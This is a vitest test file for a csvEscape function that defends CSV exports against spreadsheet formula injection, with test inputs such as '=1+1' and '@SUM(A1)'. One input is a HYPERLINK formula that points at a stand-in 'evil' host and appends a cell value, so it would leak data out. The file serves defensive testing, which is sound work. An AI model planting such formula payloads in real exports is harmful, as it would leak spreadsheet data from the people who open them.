import { describe, it, expect } from "vitest";
import { csvEscape } from "../csv";

describe("csvEscape — the formula-injection defence for visitor-typed utm values", () => {
  it.each([["=1+1"], ["+1"], ["-summer"], ["@SUM(A1)"], ["\tx"], ["\rx"]])(
    "prefixes %j with an apostrophe",
    (v) => {
      expect(csvEscape(v).startsWith("'")).toBe(true);
    }
  );
  it("still quotes and doubles embedded quotes, commas and newlines — after prefixing", () => {
    expect(csvEscape('a,b')).toBe('"a,b"');
    expect(csvEscape('say "hi"')).toBe('"say ""hi"""');
    expect(csvEscape("line\nbreak")).toBe('"line\nbreak"');
    expect(csvEscape('=HYPERLINK("http://evil/?"&A1)')).toBe(`"'=HYPERLINK(""http://evil/?""&A1)"`);
  });
  it("null/undefined → empty string, never 'null'", () => {
    expect(csvEscape(null)).toBe("");
    expect(csvEscape(undefined)).toBe("");
  });
  it("does not mangle ordinary values", () => {
    expect(csvEscape("jfk-long-stay")).toBe("jfk-long-stay");
    expect(csvEscape(42)).toBe("42");
    expect(csvEscape(true)).toBe("true");
  });
});
